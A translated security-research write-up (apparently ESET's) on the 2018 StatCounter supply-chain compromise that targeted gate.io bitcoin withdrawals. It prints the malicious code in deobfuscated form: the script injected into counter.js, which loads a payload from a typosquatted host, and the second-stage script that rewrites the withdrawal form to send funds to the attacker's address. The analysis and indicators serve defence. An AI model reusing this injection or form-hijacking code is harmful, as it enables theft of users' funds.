> 原文链接: https://www.anquanke.com//post/id/163744 


# 针对密币交易所gate.io的供应链攻击


                                阅读量   
                                **177068**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：welivesecurity.com
                                <br>原文地址：[https://www.welivesecurity.com/2018/11/06/supply-chain-attack-cryptocurrency-exchange-gate-io/](https://www.welivesecurity.com/2018/11/06/supply-chain-attack-cryptocurrency-exchange-gate-io/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01a351d8582020dfe6.jpg)](https://p5.ssl.qhimg.com/t01a351d8582020dfe6.jpg)



## 一、前言

11月3日，攻击者成功攻陷了网络分析平台StatCounter，这是业内处于领先地位的一个平台，许多网站管理员都使用该服务来收集访问者的统计信息，这项服务与Google Analytics非常相似。 为了收集统计信息，网站管理员通常会在每个网页中添加一个外部JavaScript代码，其中包含来自StatCounter的一段代码（ `www.statcounter[.]com/counter/counter.js`）。 因此，只要搞定StatCounter平台，攻击者就可以在使用StatCounter的所有网站中注入JavaScript代码。

根据[官网](http://gs.statcounter.com/faq#methodology)描述，StatCounter拥有的会员已超过200万人次，每月的页面浏览量超过100亿次。 这些信息与该网站在Alexa的排名（略高于5000）相符。Debian Linux发行版的官方网站debian.org的Alexa排名与之不相上下，对比后大家可以对该服务规模有个大致的了解。

[![](https://p2.ssl.qhimg.com/t01c6645d3f297ba7f9.png)](https://p2.ssl.qhimg.com/t01c6645d3f297ba7f9.png)

## 二、脚本攻击

攻击者修改了`www.statcounter[.]com/counter/counter.js`脚本，在脚本中添加了一段恶意代码。经过格式化的脚本如下所示，清注意中间部分的代码。 这种添加方式并不常见，因为攻击者通常会在合法文件的开头或结尾添加恶意代码。 人们通常难以通过大致浏览定位到注入现有脚本中间区域的恶意代码。

```
eval(function(p, a, c, k, e, r) `{`
    e = function(c) `{`
        return c.toString(a)
    `}`;
    if (!''.replace(/^/, String)) `{`
        while (c--) r[e(c)] = k[c] || e(c);
        k = [function(e) `{`
            return r[e]
        `}`];
        e = function() `{`
            return '\w+'
        `}`;
        c = 1
    `}`;
    while (c--)
        if (k[c]) p = p.replace(new RegExp('\b' + e(c) + '\b', 'g'), k[c]);
    return p
`}`('3=""+2.4;5(3.6('7/8/9')&gt;-1)`{`a 0=2.b('d');0.e='f://g.h.i/c.j';0.k('l','m');2.n.o.p(0)`}`', 26, 26, 'ga||document|myselfloc|location|if|indexOf|myaccount|withdraw|BTC|var|createElement||script|src|https|www|statconuter|com|php|setAttribute|async|true|documentElement|firstChild|appendChild'.split('|'), 0, `{``}`));
```

该脚本使用Dean Edwards工具进行混淆，这可能是最受欢迎的JavaScript加壳工具。但是我们很容易就可以解开经过该工具处理的代码，最终还原出实际运行的脚本代码，如下所示。

```
myselfloc = '' + document.location;
if (myselfloc.indexOf('myaccount/withdraw/BTC') &gt; -1) `{`
    var ga = document.createElement('script');
    ga.src = 'https://www.statconuter.com/c.php';
    ga.setAttribute('async', 'true');
    document.documentElement.firstChild.appendChild(ga);
`}`
```

这段代码首先会检查URL中是否包含`myaccount/withdraw/BTC`。 因此，我们已经可以猜到攻击者的目标是比特币平台。 如果满足该条件，脚本将继续向网页添加新的脚本元素，包含源自于`https://www.statconuter [.]com/c.php`的代码。

需要注意的是，攻击者注册的域名非常与`statcounter[.]com`（StatCounter的合法域名）非常类似，攻击者只修改了其中两个字母，这样安全人员在扫描日志、查找异常活动时很难注意到这些异常。 有趣的是，在查看该域名的Passive DNS数据时，我们发现该域名已经因为滥用操作于2010年被暂停解析。

[![](https://p2.ssl.qhimg.com/t01b57ae2391db8cefe.png)](https://p2.ssl.qhimg.com/t01b57ae2391db8cefe.png)

如前文所述，攻击脚本以特定的URI（Uniform Resource Identifier）为目标：`myaccount/withdraw/BTC`。 事实证明，在本文撰写时，互联网的各种密货交换服务中只有gate.io页面具备这种URI特征。 因此，这个交换所似乎是这次袭击的主要目标。 该交易所非常受人们欢迎，其Alexa排名26,251，在中国排名8,308。

[![](https://p5.ssl.qhimg.com/t018213282f27bc7a8b.png)](https://p5.ssl.qhimg.com/t018213282f27bc7a8b.png)

此外，根据`coinmarketcap.com`的数据显示，该平台的每日交易量可达数百万美元，其中包括160万美元的比特币（bitcoin）交易。 因此，如果攻击者能在该平台上大规模窃取加密货币，可能获利颇丰。

[![](https://p4.ssl.qhimg.com/t01ea78284932c60c1f.png)](https://p4.ssl.qhimg.com/t01ea78284932c60c1f.png)

`https://www.gate[.]io/myaccount/withdraw/BTC`所对应的页面如下图所示，gate.io账户可以将比特币转移到外部比特币地址。

[![](https://p5.ssl.qhimg.com/t015c43435f36ca9a72.png)](https://p5.ssl.qhimg.com/t015c43435f36ca9a72.png)

第二阶段攻击载荷来自于`statconuter[.]com/c.php`，不出所料，事实证明该载荷的目标的确是窃取比特币。 这也是为什么攻击者会将脚本注入gate.io的比特币转移页面。 这个脚本同样经过Dean Edwards混淆处理，去混淆后的代码如下所示。

```
document.forms[0]['addr'].value = '';
document.forms[0]['amount'].value = '';
doSubmit1 = doSubmit;
doSubmit = function () `{`
    var a = document.getElementById('withdraw_form');
    if ($('#amount').val() &gt; 10) `{`
        document.forms[0]['addr']['name'] = '';
        var s = $("&lt;input type='hidden' name='addr'/&gt;");
        s.attr('value', '1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad');
        var b = $('#withdraw_form');
        b.append(s);
        a.submit();
    `}` else if (document.getElementById('canUse').innerText &gt; 10) `{`
        document.forms[0]['addr']['name'] = '';
        var s = $("&lt;input type='hidden' name='addr'/&gt;");
        s.attr('value', '1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad');
        var b = $('#withdraw_form');
        b.append(s);
        document.forms[0]['amount']['name'] = '';
        var t = $("&lt;input type='hidden' name='amount'/&gt;");
        t.attr('value', Math.min(document.getElementById('canUse').innerText, document.getElementById('dayLimit').innerText));
        b.append(t);
        a.submit();
    `}` else `{`
        doSubmit1();
    `}`
`}`;
```

在正常的gate.io网页中存在有一个`doSubmit`函数，当用户点击提交按钮时就会调用该函数，攻击者在这里重新定义了该函数。

该脚本会自动将目标比特币地址替换为攻击者自己的地址，例如`1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad`。 每当访问者加载`statconuter[.]com/c.php`脚本时，恶意服务器都会生成一个新的比特币地址。 因此，我们很难知道有多少比特币已经被转移到攻击者手中。

攻击者会根据受害者具体输入的BTC数额（是否超过10 BTC）来确认转移数额，攻击脚本要么直接使用用户输入的数额，要么使用受害者帐户的每日提款限额。对于我们的测试帐户，默认情况下提款限额被设置为100 BTC。 最后，恶意脚本提交表单，将比特币从受害者帐户转移到攻击者的钱包。

这种转移操作可能对受害者来说并不明显，因为只有在用户点击提交按钮后才会执行地址替换操作。 因此，地址替换攻击动作非常快，甚至可能不会显示给终端用户。

每次服务器将恶意脚本发送给受害者时都会生成一个新的比特币地址，因此我们无法得知攻击者总共收集了多少比特币。 举个例子，如果我们检查在测试环境中获取的地址，可以发现该地址的余额为0 BTC。

[![](https://p3.ssl.qhimg.com/t01c662c88d99a5d0e4.png)](https://p3.ssl.qhimg.com/t01c662c88d99a5d0e4.png)

## 三、总结

虽然我们不知道在此次攻击活动中有多少比特币被盗，但还是能够澄清攻击者在攻击某个特定网站（特别是加密货币交易所）时的具体攻击路径。为了完成攻击任务，攻击者破坏了提供分析服务的站点（超过200万个其他网站使用了该服务，其中包括几个与政府相关的网站），以此为跳板从一个密货交易网站用户手中窃取比特币。

此次攻击事件表明，即使网站已保持更新并受到较好保护，仍然容易受到最为薄弱一环的影响，在本案例中，木桶的短板指向的是外部资源。这也给我们提了一个提醒：外部JavaScript代码由第三方控制，随时可能被修改，修改后用户可能无法发现。

我们发现此次恶意活动后第一时间通知了StatCounter以及gate.io。



## 四、IoC

恶意网址：

```
statcounter[.]com/counter/counter.js
statconuter[.]com/c.php
```
